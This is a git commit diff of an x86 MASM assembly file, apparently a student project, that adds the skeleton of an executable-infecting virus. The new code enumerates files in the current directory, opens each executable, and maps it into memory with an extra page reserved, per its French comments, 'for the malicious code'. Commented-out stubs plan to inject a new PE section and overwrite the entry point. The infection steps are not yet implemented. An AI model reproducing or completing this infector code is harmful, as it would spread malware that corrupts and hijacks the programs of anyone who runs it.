8926fd3c878e8021a75dd216e44a5ae82305e8dc
Lhomme <adrien.bournat@epitech.eu>
2017-02-03 00:33:15 +0100

    update

--- yharnam.asm
+++ yharnam.asm
@@ -24,6 +24,12 @@ includelib C:\masm32\lib\masm32.lib
  	strMessage	db "Hello World!",0
  	
 	pathTargetL		db		"Path target",0
+	listTargetL		db		"Targets list",0
+	
+	;
+	; Addresse de l'exe mappé
+	;
+	mappedAddr		db		0
 
 ;
 ; Struct url
@@ -46,26 +52,162 @@ CheckExe proc Path:PTR BYTE
 	ret
 CheckExe endp
 
+MapExe proc path:DWORD
+	local buff:OFSTRUCT
+	
+	local hfile:HANDLE
+	local nSize:DWORD
+	local fileSizeHigh:DWORD
+	
+	local hfileMap:HANDLE
+	
+	; Ouvre l'exe
+	invoke OpenFile, path, ADDR buff, 2h
+ 	mov hfile, eax
+	;invoke MessageBox, 0, uhex$(hfile), ADDR strTitle, MB_OK
+	
+	invoke GetFileSize, hfile, ADDR fileSizeHigh
+	mov nSize, eax
+	
+	; Ajoute plus d'espace (une page) pour le code malicieux
+	add nSize, 1000h
+	
+	invoke CreateFileMapping, hfile, 0, PAGE_READWRITE, 0, nSize, 0
+	mov hfileMap, eax
+	;invoke MessageBox, 0, uhex$(hfile), ADDR strTitle, MB_OK
+	
+	invoke MapViewOfFile, hfileMap, FILE_MAP_ALL_ACCESS, 0, 0, 0h
+	
+	mov DWORD PTR mappedAddr, eax
+	invoke MessageBox, 0, uhex$(eax), ADDR strTitle, MB_OK
+
+	;
+	;
+	;  L'executable est mappé en memoire.
+	;
+	;
+	
+	; set entryPoint
+	; set nbSections
+	;invoke GetInfoPE
+	
+	;
+	; Ajout d'une section dans l'executable.
+	;
+	;	- Rajouter une IMAGE_SECTION_HEADER à la fin du header de sections
+	;				
+	;       - Name[IMAGE_SIZEOF_SHORT_NAME] => Nom de la section
+	;		- DWORD |PhysicalAdresse + VirutSize
+	;		- DWORD VirtualAddress => Address premier byte de la section
+	;		-
+	;invoke GetLastSection
+	;invoke InjectSection, eax
+	
+	 
+	;invoke OverwriteEntryPoint, 00414243h
+	;invoke DisplayEntryPoint
+	;invoke SectionTable
+	ret
+MapExe endp
+
+ProcessFile proc uses edi edx Directory:PTR BYTE, File:PTR BYTE
+	local fileTarget[512]:byte
+
+	invoke StrLen, Directory
+	invoke MemCopy, Directory, ADDR fileTarget, eax
+	
+	invoke StrLen, Directory
+	lea edi, fileTarget
+	add edi, eax
+	invoke StrLen, File
+	mov edx, edi
+	add edx, eax
+	mov BYTE PTR [edx], 0
+	invoke MemCopy, File, edi, eax
+	
+	invoke CheckExe, ADDR fileTarget
+	test eax, eax
+	jz ProcessFileEnd
+	
+	invoke MessageBox, 0, ADDR fileTarget, ADDR listTargetL, MB_OK
+ 	invoke MapExe, ADDR fileTarget
+ 	;
+ 	; Mapping de l'exe
+ 	;
+ 	
+ProcessFileEnd:
+	ret
+ProcessFile endp
+
+;
+;
+;
+align 4
+
+Yharnam proc uses esi edi Directory:PTR BYTE
+	local hfile:HANDLE
+	local ffd:WIN32_FIND_DATA
+	local directoryFilter[128]:byte
+	
+	; Rajoute "*" pour le filtre
+	invoke StrLen, Directory
+	lea edi, directoryFilter
+	add edi, eax
+	mov WORD PTR [edi], 002Ah
+	
+	invoke MemCopy, Directory, ADDR directoryFilter, eax
+	
+	;Sinvoke MessageBox, 0, ADDR directoryFilter, ADDR listTargetL, MB_OK
+	
+	invoke FindFirstFile, ADDR directoryFilter, ADDR ffd
+	mov hfile, eax
+
+	;invoke MessageBox, 0, uhex$(eax), ADDR listTargetL, MB_OK
+BDIR:
+	test eax, eax
+ 	jz BDIREND
+ 	;mov eax, 0
+ 	
+ 	; Mes dans ebx l'addresse de ffd
+	lea esi, ffd
+	; Mes dans edx l'addresse de cFileName
+	lea esi, [esi].WIN32_FIND_DATA.cFileName
+
+	; Affiche le nom du fichiers présent (ADDR du buffer dans edx)
+	;invoke MessageBox, 0, esi, ADDR listTargetL, MB_OK
+	;invoke MessageBox, 0, Directory, ADDR listTargetL, MB_OK
+	
+	invoke ProcessFile, Directory, esi
+	; Le retour de FindNextFile est save dans eax
+	invoke FindNextFile, hfile, ADDR ffd
+	jmp BDIR
+BDIREND:
+	ret
+Yharnam endp
+
+
 ; ---------------------------------------------------------
 ;
 ; ---------------------------------------------------------
+
+align 4
+
 WinMain proc
 	; Destination pour le path
 	local buff[128]:byte
 
 	; WIN API
-	invoke GetCurrentDirectory, 128, ADDR buff
+	invoke GetCurrentDirectory, 124, ADDR buff
 	
-	; Rajoute "\*" au path
-	invoke StrLen, ADDR buff
+ 	invoke StrLen, ADDR buff
 	lea edi, buff
 	add edi, eax
-	mov DWORD PTR [edi], 00002A5Ch
-
+	mov WORD PTR [edi], 005Ch
 	; Affiche le buffer et la taille avant rajout de "\*"
 	invoke MessageBox, 0, ADDR buff, ADDR pathTargetL, MB_OK	
 	;invoke MessageBox, 0, uhex$(eax), ADDR strTitle, MB_OK
 	
+	invoke Yharnam, ADDR buff
 	ret
 WinMain endp
 
